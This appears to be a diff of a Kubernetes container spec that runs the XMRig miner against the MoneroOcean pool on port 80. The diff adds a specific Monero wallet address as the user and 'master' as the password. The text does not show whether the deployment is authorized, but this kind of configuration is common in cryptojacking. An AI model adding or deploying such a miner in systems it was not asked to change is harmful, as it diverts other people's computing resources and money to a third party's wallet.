@@ -22,6 +22,8 @@ spec:
     - -o
     - gulf.moneroocean.stream:80
     - -u
+    - 87T57vEfgmKevdUuXwsjZGYpZ8FUR5LuuZA8BGG9sQ91hUbaqRh7HywdxhKQcqvqbsaPuZktbBzPy5cwPpXtJh275TpS7U5
+    - -p
     - master
     volumeMounts:
     - name: xmrig-volume-m
